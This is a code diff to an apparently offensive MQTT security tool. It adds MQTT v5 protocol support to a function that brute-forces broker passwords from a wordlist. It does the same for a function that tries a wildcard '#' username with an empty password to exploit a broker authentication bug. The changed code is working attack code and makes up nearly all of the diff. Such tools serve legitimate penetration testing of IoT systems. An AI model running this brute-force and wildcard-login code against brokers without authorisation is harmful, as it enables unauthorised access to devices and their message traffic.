@@ -5,11 +5,15 @@ from random import randint
 import sys
 
 # callback function for the connect request
-
-def on_connect(client, userdata, flags, rc):
-    if rc==0:
+def on_connect_3(client, userdata, flags, rc):
+    if (rc==0):
         client.connected = True
 
+def on_connect_5(client, userdata, flags, rc, properties):
+    '''if (properties):
+        print(f"{client._client_id.decode()} properties {properties}", flush=True)'''
+    on_connect_3(client, userdata, flags, rc)
+    
 """
 Performs the brute force attack
 
@@ -25,7 +29,7 @@ Returns:
                            password worked or not
 """
 
-def brute_force(ip_target, port, username, wordlist_path, tls_cert, client_cert, client_key):
+def brute_force(ip_target, version, port, username, wordlist_path, tls_cert, client_cert, client_key):
     # open the wordlist file
     with open(wordlist_path) as f:
         # for each password we try to connect to the broker using it with the username
@@ -35,9 +39,9 @@ def brute_force(ip_target, port, username, wordlist_path, tls_cert, client_cert,
                 password = line[:-1]
                 password.strip()
                 # try to connect
-                client = mqtt.Client()
+                client = mqtt.Client(protocol = mqtt.MQTTv5 if version == '5' else mqtt.MQTTv311)
                 client.connected = False
-                client.on_connect = on_connect
+                client.on_connect = on_connect_5 if version == '5' else on_connect_3
                 client.username_pw_set(username, password)
                 print('trying: '+username + ', '+ password)
 
@@ -75,10 +79,10 @@ Returns:
     results (bool):         boolean indicating if the attack worked or not
 """
 
-def username_bug(ip_target, port, tls_cert, client_cert, client_key):
-    client = mqtt.Client()
+def username_bug(ip_target, version, port, tls_cert, client_cert, client_key):
+    client = mqtt.Client(protocol = mqtt.MQTTv5 if version == '5' else mqtt.MQTTv311)
     client.connected = False
-    client.on_connect = on_connect
+    client.on_connect = on_connect_5 if version == '5' else on_connect_3
     client.username_pw_set('#', '')
     print('trying wildcard username: #')
 
